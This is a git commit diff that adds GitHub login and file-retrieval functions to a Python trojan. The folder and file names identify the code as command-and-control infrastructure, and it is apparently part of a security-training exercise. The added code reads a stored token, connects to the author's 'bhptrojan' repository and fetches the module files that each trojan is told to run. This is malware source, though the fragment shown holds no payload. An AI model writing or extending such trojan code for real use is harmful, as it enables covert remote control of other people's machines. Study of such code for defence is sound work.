c8ffc988d4bd0165d8eea81437b441dae4c28c18
AnLau25 <avald024@uottawa.ca>
2025-06-19 18:25:07 -0400

    github_connect() & get_file_contents()

--- GithubCommand&Control/git_trojan.py
+++ GithubCommand&Control/git_trojan.py
@@ -9,3 +9,14 @@ import time
 
 from datetime import datetime
 
+def github_connect(): # Reads github token
+    with open('mytoken.txt') as f: # Write created token to mytoken file
+        token = f.read()
+    user = 'AnLau25'
+    sess = github3.login(token=token)
+    return sess.repository(user, "bhptrojan")
+    # Dif trojans require dif files, to control what each trojan does
+
+def get_file_contents(dirname, module_name, repo): # Return contents to module
+    return repo.file_contents(f'{dirname}/{module_name}').content
+
